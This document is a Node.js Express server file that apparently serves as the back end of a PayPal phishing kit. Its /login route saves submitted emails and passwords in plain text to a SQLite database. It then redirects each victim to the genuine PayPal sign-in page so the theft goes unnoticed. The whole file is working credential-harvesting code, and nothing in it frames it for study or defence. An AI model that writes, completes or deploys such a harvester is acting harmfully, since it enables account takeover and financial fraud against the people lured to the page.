const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const db = new sqlite3.Database('users.db');

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Initialize DB
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL
  )`);
});

// Routes
app.post('/login', (req, res) => {
  const { email, password } = req.body;

 // console.log("Test 1 ")
  db.run('INSERT INTO users (email, password) VALUES (?, ?)', [email, password], function(err) {
    if (err) {
      console.error(err);
      return res.status(500).send('Server error');
    }
    //res.send('Login details received. Thank you.');
    res.redirect('https://www.paypal.com/signin');
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
